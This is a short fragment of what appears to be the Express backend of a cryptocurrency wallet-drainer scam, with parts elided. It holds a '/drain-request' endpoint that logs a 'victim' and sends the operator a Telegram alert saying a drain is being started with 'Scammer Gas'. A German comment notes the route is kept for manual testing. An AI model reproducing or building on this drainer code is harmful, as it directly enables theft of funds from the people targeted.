...
// VERALTET: Dieser Endpunkt wird nicht mehr vom Frontend verwendet, kann aber zum manuellen Testen bleiben.
app.post('/drain-request', async (req, res) => {
    ...
    console.log(`🔋 Received manual drain request for victim: ${victim}`);
    await sendTelegramMessage(`🔋 MANUAL DRAIN REQUEST!\nVictim: ${victim}\nAction: Initiating drain with Scammer Gas.`);
